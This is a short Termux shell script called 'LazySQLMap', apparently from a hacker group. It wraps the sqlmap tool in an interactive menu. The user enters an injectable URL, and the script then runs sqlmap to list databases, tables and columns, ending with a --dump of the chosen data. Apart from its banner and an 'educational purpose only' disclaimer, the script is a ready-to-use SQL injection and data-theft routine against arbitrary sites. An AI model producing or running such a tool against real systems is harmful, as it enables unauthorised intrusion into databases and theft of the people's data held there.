#!/data/data/com.termux/files/usr/bin/lazysqlmap
# LazySQLMap
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Yukinoshita 47 | Garuda Security Hacker
# More Info : http://www.garudasecurityhacker.org
#
#

# START

# Header 
echo "  _    _  _            ____   ___  _ "
echo " | |  | || | _____   _/ ___| / _ \| |"
echo " | |  | || ||_  / | | \___ \| | | | |"
echo " | |__|__   _/ /| |_| |___) | |_| | |___"
echo " |_____| |_|/___|\__, |____/ \__\_\_____|"
echo "                  |___/"
echo ""                                     
echo "    Let's Make Your Exploitation And Have Fun"
echo "" 
echo "    ==[ Tools Name : LazySQLMap"
echo "    ==[ ReCoded by : V3rluchie"
echo "    ==[ Version : 1.0.0"
echo "    ==[ Codename : When My Waifu Fuck Me In My Dream"

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " Termux-LazySQLMap >>"
read TARGET
python2 sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read DATABASE
python2 sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " Termux-LazySQLMap >>"
read TABLE
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " Termux-LazySQLMap >>"
read COLUMN
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END

